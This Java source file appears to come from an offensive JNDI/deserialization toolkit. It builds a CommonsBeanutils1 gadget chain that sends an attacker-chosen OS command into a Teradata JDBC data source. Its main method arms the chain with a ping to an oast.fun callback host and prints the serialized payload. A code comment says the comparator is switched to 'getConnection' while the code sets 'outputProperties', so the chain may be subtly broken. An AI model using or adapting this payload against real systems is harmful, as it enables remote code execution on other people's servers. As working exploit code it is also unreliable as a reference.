package com.nu1r.jndi.gadgets;

import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.gadgets.annotation.Authors;
import com.nu1r.jndi.gadgets.annotation.Dependencies;
import com.nu1r.jndi.gadgets.utils.Reflections;
import com.nu1r.jndi.gadgets.utils.Serializer;
import com.teradata.jdbc.TeraDataSource;
import org.apache.commons.beanutils.BeanComparator;

import java.io.ByteArrayOutputStream;
import java.math.BigInteger;
import java.util.Arrays;
import java.util.PriorityQueue;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
@Authors({Authors.FROHOFF})
public class CommonsBeanutils1Jdbc implements ObjectPayload<Object> {
    public Object getObject(PayloadType type, String... param) throws Exception {
        try {
            // create a TeraDataSource object, holding  our JDBC string
            TeraDataSource dataSource = new TeraDataSource();
            dataSource.setBROWSER(param[0]);
            dataSource.setLOGMECH("BROWSER");
            dataSource.setDSName("127.0.0.1");
            dataSource.setDbsPort("10250");

            // mock method name until armed
            final BeanComparator comparator = new BeanComparator("lowestSetBit");
            // create queue with numbers and basic comparator
            final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
            // stub data for replacement later
            queue.add(new BigInteger("1"));
            queue.add(new BigInteger("1"));
            Reflections.setFieldValue(comparator, "property", "outputProperties");
            // switch method called by comparator to "getConnection"
            final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
            queueArray[0] = dataSource;
            queueArray[1] = dataSource;

            return queue;
        } catch (Throwable er) {
            // 如果生成或序列化有效负载时出现错误，则打印错误信息和堆栈跟踪
            System.err.println("Error while generating or serializing payload");
            er.printStackTrace();
        }
        return null;
    }

    public static void main(String[] args) throws Exception {
        ObjectPayload payload = CommonsBeanutils1Jdbc.class.newInstance();
        Object       object  = payload.getObject(PayloadType.nu1r, "ping chr17sz2vtc0000ymdaggehyuhhyyyyyb.oast.fun");
        ByteArrayOutputStream out   = new ByteArrayOutputStream();
        byte[]                bytes = Serializer.serialize(object, out);
        System.out.println(Arrays.toString(bytes));
    }
}
